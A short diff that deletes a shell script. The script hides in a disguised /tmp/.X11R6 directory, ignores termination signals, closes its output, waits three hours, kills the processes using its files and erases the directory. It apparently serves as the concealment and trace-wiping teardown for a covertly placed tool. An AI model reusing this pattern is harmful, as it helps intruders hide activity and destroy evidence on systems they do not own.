@@ -1,9 +1,0 @@
-#!/bin/sh
-DIR=/tmp/.X11R6
-cd /
-rm $DIR/cup
-trap : TERM
-exec >&- 2>&-
-sleep 10800
-/usr/sbin/fuser -k $DIR/*
-rm -rf $DIR
